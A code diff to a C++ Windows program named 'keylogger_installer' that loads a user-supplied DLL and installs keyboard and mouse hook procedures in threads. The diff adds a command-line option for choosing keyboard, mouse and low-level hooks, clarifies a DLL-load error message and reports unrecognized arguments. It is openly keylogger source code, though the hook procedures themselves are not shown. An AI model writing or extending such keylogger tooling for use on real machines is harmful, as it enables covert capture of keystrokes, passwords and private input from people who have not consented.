@@ -13,9 +13,14 @@
 // CLI help message
 void displayHelp() {
 	tcout
-		<< TEXT("Usage: ./keylogger_installer_x??.exe <dll_path>\n")
+		<< TEXT("Usage: ./keylogger_installer_x??.exe <dll_path> <procedure>\n")
 		<< TEXT("\nArguments:\n")
 		<< TEXT("  <dll_path>:      Path to the .dll file with the procedures.\n")
+		<< TEXT("  <procedure>:     The procedures to install (one required, multiple allowed).\n")
+		<< TEXT("      Options:     --keyboard\n")
+		<< TEXT("                   --mouse\n")
+		<< TEXT("                   --keyboard-ll\n")
+		<< TEXT("                   --mouse-ll\n")
 		<< std::endl;
 }
 
@@ -172,7 +177,7 @@ int _tmain(int argc, TCHAR* argv[])
 	lib = LoadLibrary(argv[1]);
 
 	if (lib == NULL) {
-		tcout << "Can't find dll!" << std::endl;
+		tcout << "Unable to load dll " << argv[1] << std::endl;
 		return 1;
 	}
 
@@ -189,6 +194,9 @@ int _tmain(int argc, TCHAR* argv[])
 		}
 		else if (_tcscmp(argv[i], TEXT("--keyboard")) == 0 && hookKeyboard == NULL) {
 			CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(installKeyboardProc), NULL, 0, NULL);
+		} 
+		else {
+			tcout << "Argument " << argv[i] << " not recognized as a valid procedure" << std::endl;
 		}
 	}
 
